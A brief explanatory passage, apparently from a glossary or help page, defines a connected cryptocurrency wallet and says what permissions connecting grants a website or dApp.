A connected wallet refers to a cryptocurrency wallet that is linked to a website, app, or decentralized platform (dApp) to enable blockchain-based interactions — such as trading, staking, minting NFTs, or accessing DeFi services.

A connected wallet allows users to authenticate and transact directly on blockchain platforms without creating traditional accounts. When you “connect” a wallet, you’re granting the site permission to view your public address and initiate transactions (which you must approve manually).
